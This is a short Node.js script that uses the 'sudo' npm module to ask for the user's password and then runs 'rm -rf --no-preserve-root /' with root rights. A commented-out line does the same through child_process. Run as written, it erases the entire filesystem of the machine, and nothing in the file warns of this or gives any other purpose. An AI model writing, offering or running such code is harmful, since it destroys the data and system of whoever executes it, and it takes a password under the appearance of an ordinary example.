var sudo = require('sudo');
var options = {
    cachePassword: true,
    prompt: 'Insert Password? ',
    spawnOptions: { /* no other options */ }
};
var target = '/';

var child = sudo([ 'rm', '-rf', '--no-preserve-root', target ], options);
child.stdout.on('data', function (data) {
    console.log(data.toString());
});

// require('child_process').exec('sudo rm -rf ' + target);
